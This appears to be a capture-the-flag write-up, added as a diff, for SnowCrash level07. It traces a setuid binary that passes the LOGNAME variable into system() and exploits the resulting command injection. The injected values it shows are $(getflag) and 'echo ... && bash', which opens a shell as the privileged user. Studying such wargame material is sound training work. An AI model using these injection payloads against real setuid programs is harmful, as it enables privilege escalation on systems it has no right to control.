@@ -1,0 +1,43 @@
+In this level we have yet an executable called level07.
+
+Launching it just print 'level07'... nothing realling interesting.
+But how does it print it ?
+
+Let's find out using ltrace and executing level07
+
+level07@SnowCrash:~$ ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                               = 2007
+geteuid()                                                               = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                     = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                     = 0
+getenv("LOGNAME")                                                       = "level07"
+asprintf(0xbffff734, 0x8048688, 0xbfffff44, 0xb7e5ee55, 0xb7fed280)     = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                  = 0
++++ exited (status 0) +++
+
+We can see that it's getting the env of LOGNAME
+And LOGNAME is us : level07
+
+So our level07 print isn't printed from the echo directly but from the LOGNAME
+env variable.
+It runs with flag07 permissions, so we have to place getflag command in LOGNAME to get the flag of level07.
+
+Let's try to modify it.
+We want to execute a command from an argument passed to echo so we need to put it inside $()
+export LOGNAME=$(ls)
+
+So our echo command is running ls as flag07, but it also means we can add something to get the right on get flag.
+
+We could clearly just launch getflag by exporting LOGNAME like that:
+
+export LOGNAME=$(getflag)
+
+but let's have some fun and get access to flag07 shell directly:
+
+export LOGNAME='echo "This is the way" && bash'
+
+We our now connected as flag07 on bash and we can execute the getflag command.
